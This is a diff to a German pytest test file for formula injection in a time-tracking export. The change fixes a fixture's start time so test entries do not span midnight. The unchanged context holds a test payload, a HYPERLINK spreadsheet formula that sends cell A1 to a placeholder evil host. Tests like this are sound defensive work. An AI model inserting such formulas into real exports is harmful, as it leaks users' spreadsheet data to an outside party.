@@ -1,7 +1,7 @@
 """Formel-Einschleusung in den Export (Issue 15)."""
 
 import io
-from datetime import timedelta
+from datetime import datetime, time, timedelta
 
 import pytest
 from django.utils import timezone
@@ -15,7 +15,10 @@ FORMULA = '=HYPERLINK("http://boese.example/?x"&A1,"Klick")'
 
 @pytest.fixture
 def entry_with_formula_note(member, group, activity):
-    start = timezone.now().replace(microsecond=0) - timedelta(hours=5)
+    # Feste Tageszeit statt "jetzt minus fünf Stunden": je nach Uhrzeit des
+    # Testlaufs liefe der Eintrag sonst über Mitternacht und zählte anteilig
+    # auf zwei Tage (Issue 32).
+    start = timezone.make_aware(datetime.combine(timezone.localdate(), time(8, 0)))
     return TimeEntry.objects.create(
         user=member,
         group=group,
